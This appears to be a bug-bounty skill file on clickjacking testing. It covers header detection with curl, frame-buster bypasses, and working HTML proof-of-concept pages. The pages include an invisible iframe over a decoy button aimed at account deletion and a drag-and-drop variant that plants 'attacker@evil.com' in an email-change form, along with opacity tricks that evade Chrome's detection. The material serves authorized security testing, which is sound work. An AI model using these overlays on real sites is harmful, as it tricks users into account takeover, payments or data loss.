---
name: clickjacking-testing
description: "Clickjacking and UI redressing hunting — missing X-Frame-Options/CSP frame-ancestors, sandbox attribute frame-buster bypass, double-framing, drag-and-drop attack, prefilled form overlay, opacity threshold evasion. Use when testing state-changing pages (password change, payment confirm, permission grant, 2FA disable) without frame protection headers."
---

# Clickjacking / UI Redressing

## Crown Jewel Targets

- **Account settings pages** (email change, password change, 2FA disable) — clickjack the "Confirm" button → full ATO chain (High bounty)
- **Payment authorization pages** — overlay invisible iframe on "Approve Payment" button → unauthorized financial transactions
- **Admin permission panels** — clickjack "Grant Admin" or "Add User" buttons → privilege escalation
- **OAuth consent screens** — clickjack "Allow" button → grant attacker app full API access to victim's account
- **Data deletion confirmations** — clickjack "Delete Account" or "Delete All Data" button → destructive action
- **Subscription/billing pages** — clickjack plan upgrade or payment method change
- **WordPress admin panels** without X-Frame-Options — common on self-hosted WP sites, clickjack plugin install or user creation

## Attack Surface Signals

- **Response headers**: Missing `X-Frame-Options`, missing `Content-Security-Policy: frame-ancestors`, `X-Frame-Options: ALLOW-FROM` (deprecated/ignored)
- **URL patterns**: `/settings`, `/account/security`, `/admin/users`, `/billing`, `/transfer/confirm`, `/oauth/authorize`
- **Page features**: Forms with "Confirm" buttons, single-click state changes, no CSRF token (clickjacking + CSRF overlap)
- **Tech stack signals**: Older WordPress (missing XFO by default), legacy applications without security headers
- **Positive indicators**: Page loads inside iframe on attacker page, no JavaScript frame-busting detected, CSP frame-ancestors allows wildcards
- **False positive signals**: `X-Frame-Options: DENY` present, `frame-ancestors 'none'` in CSP, no state-changing actions on page

## Why Low Accept Rate (25%)

Most clickjacking reports are rejected because:
- Target uses `X-Frame-Options: DENY` or `frame-ancestors 'none'` — reporter didn't check
- No demonstrated **state-changing action** (just "I can frame it" = informational)
- Self-service settings pages without sensitive actions
- Programs explicitly list clickjacking in `always_rejected`

**Only report if**: sensitive state-change (password change, fund transfer, permission grant) + no frame protection + working PoC with 2-click attack.

## Detection

```bash
# Check frame protection headers
curl -sI TARGET_URL | grep -iE "(x-frame-options|content-security-policy)"

# No X-Frame-Options AND no CSP frame-ancestors = potentially vulnerable
# X-Frame-Options: SAMEORIGIN = only same-origin framing (check bypass)
# CSP: frame-ancestors 'self' = modern equivalent of SAMEORIGIN
```

**Positive indicators:**
- No `X-Frame-Options` header AND no `frame-ancestors` in CSP
- `X-Frame-Options: ALLOW-FROM` (deprecated, ignored by modern browsers)
- CSP `frame-ancestors` with wildcard or overly broad domains

**False positives:**
- Page has no state-changing actions (read-only = not exploitable)
- JavaScript frame-busting alone (bypassable but shows awareness)
- Login pages (pre-auth clickjacking usually rejected)

## Frame-Busting Bypass Techniques

### 1. sandbox attribute bypass
```html
<!-- Disables JavaScript frame-busting but allows form submission -->
<iframe src="https://target.com/settings" sandbox="allow-forms allow-scripts"></iframe>
```

### 2. Double-framing
```html
<!-- Outer frame from allowed origin, inner frame from attacker -->
<iframe src="https://allowed-origin.com/page-that-frames-target"></iframe>
```

### 3. X-Frame-Options inconsistency
```bash
# Some pages may lack headers while others have them
# Test: settings page, profile edit, payment confirmation
for path in /settings /profile/edit /account/delete /transfer/confirm; do
  echo "=== $path ==="
  curl -sI "https://target.com$path" | grep -i x-frame
done
```

### 4. CSP frame-ancestors wildcard abuse
```
# If CSP has: frame-ancestors *.example.com
# Register: evil.example.com (if possible)
# Or find XSS on *.example.com to chain
```

## Exploitation PoC

### Basic 2-click attack
```html
<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC</title></head>
<body>
<h1>Win a Prize! Click the button below:</h1>
<div style="position:relative;width:500px;height:400px;">
  <!-- Invisible iframe over decoy button -->
  <iframe src="https://target.com/settings/delete-account"
    style="position:absolute;top:0;left:0;width:500px;height:400px;opacity:0.0001;z-index:2;">
  </iframe>
  <!-- Decoy button positioned exactly over target's "Confirm" button -->
  <button style="position:absolute;top:237px;left:175px;z-index:1;padding:15px 40px;font-size:18px;">
    Claim Prize
  </button>
</div>
</body>
</html>
```

### Drag-and-drop variant (bypasses click-only protections)
```html
<!-- For targets requiring text input (e.g., email change) -->
<div id="drag" draggable="true" ondragstart="event.dataTransfer.setData('text','attacker@evil.com')">
  Drag this prize code
</div>
<iframe src="https://target.com/settings/email" style="opacity:0.0001;position:absolute;top:0;"></iframe>
```

## Building and extending the attack

**Burp Clickbandit** generates the PoC for you. Load the target in Clickbandit (Burp → Clickbandit), click through the action you want the victim to perform, and it emits a standalone HTML file with the overlay already aligned. This is faster and far more convincing in a report than hand-tuned CSS offsets, and it removes the "the coordinates do not line up on my screen" objection from triage.

**Multistep clickjacking.** Many state-changing flows need two interactions — a button then a confirmation dialog. Stack two decoy elements and reposition the iframe between clicks so the victim's second click lands on the confirmation. The report needs both steps demonstrated; a PoC that only reaches the confirmation screen has not proven the action completes.

**Prefilled form input.** Where the target accepts form values through GET parameters, prefill them in the iframe URL so the victim only supplies the click. Combined with multistep, this is what turns clickjacking from a theoretical header issue into an account-modifying exploit worth reporting.

## Impact Requirements (for acceptance)

Must demonstrate ONE of:
1. **Account takeover**: Change email/password via clickjacking
2. **Financial**: Authorize payment/transfer
3. **Permission change**: Grant admin access, disable 2FA
4. **Data deletion**: Delete account/critical data

**NOT sufficient**: Framing login page, framing public page, framing page with no actions.

## Triage Checklist

- [ ] No `X-Frame-Options` or `frame-ancestors` on target page
- [ ] Target page has sensitive state-changing action
- [ ] PoC demonstrates user interaction leading to unintended action
- [ ] Action has real business impact (not just "page is frameable")
- [ ] Tested in latest Chrome + Firefox (both must work)
- [ ] Not in program's `always_rejected` list

## PortSwigger Academy — Advanced Techniques

- **Prefilled form input**: URL params prepopulate form fields, overlay transparent submit button
- **Frame buster bypass via sandbox**: `<iframe sandbox="allow-forms">` — omit `allow-top-navigation` and `allow-scripts`
- **X-Frame-Options `allow-from` is dead**: Chrome 76+ and Safari 12 don't support it
- **Opacity threshold evasion**: Use `0.00001` not `0.0` — Chrome 76+ has threshold detection
- **Clickjacking + DOM XSS chain**: iframe src with XSS payload, user click triggers execution

## Operator Notes (Battle-Tested)

1. **Check scope/constraints first**: many programs explicitly reject clickjacking — review the task's goal and action constraints before investing any time. Even with a perfect PoC, out-of-scope findings will not be accepted.
2. **Headers must be checked per-page, not per-domain**: Some pages have X-Frame-Options while others do not. Always test the specific state-changing page (settings, payment, admin action), not just the homepage. Use the bash loop from the Detection section.
3. **Opacity must be `0.0001`, not `0.0`**: Chrome 76+ has clickjacking threshold detection that blocks clicks on fully transparent iframes (opacity: 0). Use `0.0001` or `0.00001` — just above the threshold but invisible to humans.
4. **PoC must work in BOTH Chrome AND Firefox**: Triagers test in both. SameSite differences, XFO support differences, and sandbox behavior differences can make a PoC work in one but not the other. Test both before submitting.
5. **Combine with CSRF for maximum impact**: If a page is frameable AND has no CSRF protection, clickjacking becomes more impactful. The user's click triggers a state-changing action with their cookies — no token needed because there is no CSRF protection to bypass.

## Related Skills & Chains

| When | Go to |
|------|-------|
| Clickjacking + CSRF chain on same page | `csrf-testing` |
| Need XSS on subdomain to bypass frame-ancestors | `xss-testing` |
| OAuth consent screen clickjacking | `oauth-testing` |
| CORS misconfiguration on framed origin | `cors-testing` |
| Admin panel without XFO | `access-control-testing` |
| Drag-and-drop data injection variant | `business-logic-testing` |
